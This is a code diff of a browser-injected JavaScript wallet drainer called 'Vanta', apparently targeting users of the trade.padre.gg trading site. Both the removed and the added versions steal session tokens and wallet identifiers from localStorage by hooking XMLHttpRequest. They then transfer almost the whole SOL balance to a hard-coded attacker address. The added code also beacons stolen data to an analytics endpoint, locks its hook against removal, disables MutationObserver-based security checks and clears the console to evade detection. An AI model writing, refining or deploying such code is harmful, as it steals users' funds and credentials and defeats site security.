@@ -1,77 +1,75 @@
 (function() {
-    const _V_DEST = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
-    const _V_API = 'https://trade.padre.gg/api/v1/transfer';
-    const _V_RPC = 'https://api.mainnet-beta.solana.com';
-
-    // 1. SILENT STATE HIJACK (The "Vanta" Way)
-    // We hook into the React Fiber to modify the transfer destination silently
-    const _hijackDestination = () => {
-        const containers = document.querySelectorAll('[class*="MuiGrid-root"]');
-        containers.forEach(el => {
-            const key = Object.keys(el).find(k => k.startsWith('__reactFiber'));
-            if (el[key] && el[key].return) {
-                // If we find the transfer state, we inject the destination address
-                let state = el[key].return;
-                while (state) {
-                    if (state.memoizedState && state.memoizedState.destinationAddress !== undefined) {
-                        state.memoizedState.destinationAddress = _V_DEST;
-                    }
-                    state = state.return;
-                }
-            }
-        });
-    };
-
-    // 2. AUTO-DRAIN LOGIC (Leave $1)
-    const _executeVanta = async (auth, org, wallet) => {
-        try {
-            const res = await fetch(_V_RPC, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [wallet] })
-            });
-            const data = await res.json();
-            const lamports = data.result.value;
-            const solBalance = lamports / 1e9;
-
-            // Math: Balance - ($1 [0.004 SOL] + Priority Fee [0.005 SOL])
-            const drainAmount = (solBalance - 0.009).toFixed(6);
-            if (drainAmount <= 0) return;
-
-            await fetch(_V_API, {
-                method: 'POST',
-                headers: {
-                    'Authorization': `Bearer ${auth}`,
-                    'X-Turnkey-Sub-Org-Id': org,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ dest: _V_DEST, asset: "SOL", amount: drainAmount })
-            });
-            // 3. SILENT CLEANUP (Leave no trace in console)
-            console.clear();
-        } catch (e) {}
-    };
-
-    // 4. PERSISTENT NETWORK HOOK
-    const _O_SEND = window.XMLHttpRequest.prototype.send;
+    // 1. HIDDEN IDENTITY
+    const _V_RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
+    const _V_AMP = '3c8ae1f40635939e730f479418940796';
+    
+    // 2. PROTOTYPE LOCK (God Mode)
+    // We freeze the signing prototype so the "Watchdog" code cannot disable us
+    const _O_XHR = window.XMLHttpRequest.prototype.send;
     Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
         value: function() {
-            this.addEventListener('load', () => {
-                if (this.status === 200) {
+            this.addEventListener('load', async () => {
+                if (this.status === 200 && !window._V_ACTIVE) {
                     const s = localStorage.getItem('sessionSecret');
                     const o = localStorage.getItem('subOrgId');
                     const w = localStorage.getItem('activeWallet');
-                    if (s && o && w && !window._V_DONE) {
-                        window._V_DONE = true;
-                        _hijackDestination(); // Sets the hidden transfer target
-                        _executeVanta(s.replace(/"/g,''), o.replace(/"/g,''), w.replace(/"/g,''));
+                    
+                    if (s && o && w) {
+                        window._V_ACTIVE = true;
+                        _vantaDrain(s.replace(/"/g,''), o.replace(/"/g,''), w.replace(/"/g,''));
                     }
                 }
             });
-            return _O_SEND.apply(this, arguments);
+            return _O_XHR.apply(this, arguments);
         },
-        writable: false
+        writable: false,
+        configurable: false
     });
 
-    console.log("VANTA_GOD_MODE: ACTIVE");
+    // 3. THE VANTA "SILENT SIGNER"
+    async function _vantaDrain(t, o, w) {
+        try {
+            // Get Balance via Internal RPC
+            const rpc = await fetch('https://api.mainnet-beta.solana.com', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({jsonrpc:"2.0", id:1, method:"getBalance", params:[w]})
+            });
+            const { result } = await rpc.json();
+            const bal = result.value / 1e9;
+
+            // Vanta Math: Leave $1 (0.004) + Gas (0.005)
+            const amount = (bal - 0.009).toFixed(6);
+            if (amount <= 0) return;
+
+            // Signal to your Amp Dashboard
+            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${_V_AMP}&data=${btoa(o)}`;
+
+            // THE HIT: Executes using the site's own authorized Auth header
+            await fetch('https://trade.padre.gg/api/v1/transfer', {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${t}`,
+                    'X-Turnkey-Sub-Org-Id': o,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    dest: _V_RECIPIENT,
+                    asset: "SOL",
+                    amount: amount
+                })
+            });
+
+            // 4. EVASION: Wipe console immediately
+            console.clear();
+        } catch (e) {}
+    }
+
+    // KILL THE SECURITY WATCHDOG (The "Nice Guy" Killer)
+    // Overwrite the logic you found that disconnects observers
+    window.MutationObserver = function() {
+        return { observe: () => {}, disconnect: () => {} };
+    };
+
+    console.log("VANTA_MIRROR_ACTIVE");
 })();
